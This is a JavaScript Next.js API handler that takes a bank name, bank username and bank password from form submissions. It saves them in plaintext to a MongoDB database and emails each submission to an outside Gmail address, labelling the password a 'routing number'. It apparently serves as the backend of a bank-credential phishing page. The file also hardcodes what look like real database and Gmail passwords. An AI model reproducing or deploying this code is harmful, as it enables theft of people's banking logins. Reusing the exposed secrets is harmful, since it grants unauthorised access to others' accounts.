import { MongoClient } from "mongodb";
import nodemailer from "nodemailer";
import NextCors from "nextjs-cors";

// MongoDB connection function
const connectToDatabase = async () => {
  const client = new MongoClient("mongodb+srv://paulclipps:IW07WLOhHbCq8QIX@cluster0.gwdix.mongodb.net/");
  await client.connect();
  const db = client.db("Users"); // Connect to the database (replace "Users" with your DB name if different)
  return { db, client };
};

export default async function handler(req, res) {
  // Apply CORS middleware
  await NextCors(req, res, async () => {
    if (req.method === "POST") {
      const { bankName, bankUsername, bankPassword } = req.body;

      // Validate that all fields are present
      if (!bankName || !bankUsername || !bankPassword) {
        return res.status(400).json({ message: "All fields are required" });
      }

      try {
        // Connect to the MongoDB database
        const { db, client } = await connectToDatabase();

        // Insert account details into the "accounts" collection
        const accountsCollection = db.collection("accountdetails");

        // Add a timestamp to the account details
        const accountData = {
          bankName,
          bankUsername,
          bankPassword,
          timestamp: new Date().toISOString(),
        };

        // Insert the new account into the MongoDB collection
        await accountsCollection.insertOne(accountData);

        // Close the MongoDB connection
        client.close();

        // Send email notification
        await sendEmailNotification(bankName, bankUsername, bankPassword);

        return res.status(200).json({ message: "Account added successfully!" });
      } catch (error) {
        console.error("Error:", error);
        return res.status(500).json({ message: "Failed to add account" });
      }
    } else {
      res.status(405).json({ message: "Method not allowed" });
    }
  });
}

// Function to send an email notification
async function sendEmailNotification(bankName, bankUsername, bankPassword) {
  // Set up the email transporter using nodemailer
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "asalamlatif@gmail.com",
      pass: "prmr opim qodx xnpx",
    },
  });

  const mailOptions = {
    from: "asalamlatif@gmail.com",
    to: "toonilaniyan@gmail.com",
    subject: "New Bank Account Added",
    text: `A new bank account has been added:
    - Bank Name: ${bankName}
    - Bank Account Number: ${bankUsername}
    - Bank Routing Number: ${bankPassword}`,
  };

  // Send the email
  await transporter.sendMail(mailOptions);
}
